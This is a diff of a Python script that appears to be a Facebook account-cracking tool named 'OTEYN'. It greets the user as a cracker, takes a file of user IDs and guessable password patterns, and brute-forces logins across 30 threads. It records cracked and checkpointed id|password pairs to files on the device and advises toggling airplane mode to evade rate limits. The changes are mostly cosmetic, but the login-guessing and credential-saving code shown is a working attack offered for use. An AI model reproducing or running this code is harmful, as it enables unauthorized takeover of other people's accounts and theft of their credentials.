@@ -999,21 +999,22 @@ def ffb1(ids,names,passlist):
 
      
 logo =""" 
-     ███████╗ ████████╗███████╗██╗   ██╗███╗   ██╗
-     ██╔═══██╗╚══██╔══╝██╔════╝╚██╗ ██╔╝████╗  ██║
-     ██║   ██║   ██║   █████╗   ╚████╔╝ ██╔██╗ ██║
-     ██║   ██║   ██║   ██╔══╝    ╚██╔╝  ██║╚██╗██║
-     ╚██████╔╝   ██║   ███████╗   ██║   ██║ ╚████║
-      ╚═════╝    ╚═╝   ╚══════╝   ╚═╝   ╚═╝  ╚═══╝
+\033[1;97m====================================================
+
+
+    \033[1;34m███████╗ ████████╗███████╗██╗   ██╗███╗   ██╗
+    \033[1;34m██╔═══██╗╚══██╔══╝██╔════╝╚██╗ ██╔╝████╗  ██║
+    \033[1;34m██║   ██║   ██║   █████╗   ╚████╔╝ ██╔██╗ ██║
+    \033[1;34m██║   ██║   ██║   ██╔══╝    ╚██╔╝  ██║╚██╗██║
+    \033[1;34m╚██████╔╝   ██║   ███████╗   ██║   ██║ ╚████║
+     \033[1;34m╚═════╝    ╚═╝   ╚══════╝   ╚═╝   ╚═╝  ╚═══╝
                                              
 \033[1;97m====================================================
-\033[1;97m[+]\033[1;95mAUTHOR   \033[1;90m: \033[1;93mOTEYN × EIFF
-\033[1;97m[+]\033[1;95mYOUTUBE  \033[1;90m: \033[1;93mNot Found !
-\033[1;97m[+]\033[1;95mWHATSAPP \033[1;90m: \033[1;93mWakeen
-\033[1;97m[+]\033[1;95mVERSION  \033[1;90m:\033[1;93m10.1
-\033[1;97m[+]\033[1;95mSTATUS   \033[1;90m: \033[1;93mEXPERIMENT
-\033[1;97m====================================================
-                \x1b[47;2m WELCOME CRACKER !!!\x1b[00;1m\x1b[31;1m
+\033[1;97m[+]\033[1;34mAUTHOR   \033[1;90m: \033[1;93mOTEYN × EIFF
+\033[1;97m[+]\033[1;34mYOUTUBE  \033[1;90m: \033[1;93mNot Found !
+\033[1;97m[+]\033[1;34mWHATSAPP \033[1;90m: \033[1;93mWakeen
+\033[1;97m[+]\033[1;34mVERSION  \033[1;90m: \033[1;93m0.1
+\033[1;97m[+]\033[1;34mSTATUS   \033[1;90m: \033[1;93mEXPERIMENT
 \033[1;97m===================================================="""
 
 def linex():
@@ -1058,7 +1059,6 @@ def asha(uid):
         alif = ' • 2006/2007'
     else:alif=''
     return alif
-
 #os.system(f'xdg-open https://youtube.com/@technicaltricks7982')
 
 def KHUSHAL():
@@ -1075,18 +1075,20 @@ def KHUSHAL():
 		except FileNotFoundError:
 			print(f' File location not found ')
 			exit()
-		print(f' [1] Method 1 (recommended)\n [2] Method 2 (Working)\n [3] Method 3 (Working)\n ')
+		clear()
+		print(f' [-] MTHD 1 (recommended)\n [-] MTHD 2 (Working)\n [-] MTHD 3 (Working)\n ')
 		mthd=input(f' Choose: ')
 		plist=[]
+		clear()
 		try:
-			print(f'\033[1;32m example: 10')
-			ps_limit = int(input(f' How many passwords do you want to add ? '))
+			ps_limit = int(input(f' [-] HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
 		except:
 			ps_limit =1
-		print(f'\033[1;32m exp: first last,firtslast,first123,first@123,first12345,firstlast12345,firstlast@123,first@12345')
+		clear()
+		print(f'\033[1;33m[-] EXMPLE: first, first123, firstlast, first last, lastfirst ')
 		for i in range(ps_limit):
-			plist.append(input(f' Put password {i+1}: '))
-		print(f' Do you went show cp account? (y/n): ')
+			plist.append(input(f'\033[1;32m[-] PUT PASSWORD {i+1}: '))
+		print(f' DO YOU WANT TO SHOW CPS ? (y/n): ')
 		cx=input(f' Choose: ')
 		if cx in ['n','N','no','NO','2']:
 			pcp.append(f'n')
@@ -1095,7 +1097,7 @@ def KHUSHAL():
 		with tred(max_workers=30) as crack_submit:
 			clear()
 			total_ids = str(len(fo))
-			print(f' Total account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod > \033[1;37mM{mthd}')
+			print(f' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' \n \033[1;37mMTHD > \033[1;37mM{mthd}')
 			print(f"\033[1;37m ON/OFF airplane mode every 90secs for speed up :)\033[1;37m")
 			linex()
 			for user in fo:
@@ -1110,7 +1112,7 @@ def KHUSHAL():
 					
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [OTEYN-E.H] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [\033[1;32mOTEYN-PROCESSING\033[1;37m]:- %s |\033[1;32mOK:- %s \033[1;37m| \033[1;91mCPS:- %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -1131,15 +1133,15 @@ def ffb(ids,names,passlist):
                         if "c_user" in Khushal:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [OTEYN-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/KHUSHAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\n\n\033[1;33m »» STATUS: \033[1;32m ALIVE\n\033[1;33m »» USER ID:\033[1;32m %s\n\033[1;33m »» PASSWORD:\033[1;32m %s\n\033[1;32m »» CREATION DATE: \033[1;32m%s\n'%(ids,pas,asha(uid)))
+                                open(f'/sdcard/OTEYN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Khushal:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [OTEYN-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/KHUSHAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\n\n\033[1;33m »» STATUS: \033[1;91mCHECKPOINT\n\033[1;33m »» USER ID:\033[1;91m '+ids+'\n\033[1;33m »» PASSWORD:\033[1;91m '+pas+'\n\033[1;97m')
+                                        open(f'/sdcard/OTEYN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
